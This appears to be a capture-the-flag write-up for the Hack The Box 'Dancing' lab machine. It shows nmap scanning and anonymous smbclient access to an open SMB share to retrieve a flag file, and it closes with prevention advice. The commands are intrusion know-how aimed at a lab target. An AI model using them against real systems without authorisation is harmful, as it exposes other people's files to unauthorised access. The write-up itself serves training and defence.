#  Dancing — Hack The Box

---

## Machine Information

| Field      | Value   |
| ---------- | ------- |
| Name       | Dancing |
| Difficulty |Very Easy|
| OS         | Windows |

---

## Objective

Identify exposed services and leverage misconfigurations to obtain the flag.

---

## Methodology

Recon → Enumeration → Exploitation → Flag Retrieval

---

##  Reconnaissance

### 📡 Nmap Scan

```bash
nmap -sC -sV -oN nmap_initial <TARGET_IP>
```

###  Key Findings

```text
445/tcp open  microsoft-ds (SMB)
139/tcp open  netbios-ssn
```

###  Insight

* SMB (port 445) is exposed → likely entry point
* Anonymous/guest access is common in misconfigured SMB setups

---

##  SMB Enumeration

List available shares:

```bash
smbclient -L //<TARGET_IP>/ -N
```

### Shares Discovered

* `WorkShares` (accessible)
* `IPC$`

###  Insight

* `-N` attempts anonymous login
* Accessible share → strong indicator of misconfiguration

---

## Initial Access

Connect to the share:

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

List files:

```bash
ls
```

###  Interesting Files

* `flag.txt`

Download:

```bash
get flag.txt
```

---

## Flag

```bash
cat flag.txt
```

---

## Key Learnings

* SMB shares can be exposed without authentication
* Always try anonymous access (`-N`)
* Enumeration is often enough for easy machines
* Misconfigured file shares can directly expose sensitive data

---

## Tools Used

* Nmap
* smbclient

---

##  Attack Timeline

| Phase        | Time   |
| ------------ | ------ |
| Recon        | 10 min |
| Enumeration  | 10 min |
| Exploitation | 5 min  |

**Total:** ~25 minutes

---

##  Prevention

* Disable anonymous SMB access
* Restrict share permissions
* Monitor file access logs
* Apply least-privilege principles

---

##  Summary

This machine highlights how **improper SMB configuration** can expose sensitive data without requiring exploitation. Proper enumeration alone led to full success.

---

For educational purposes only.
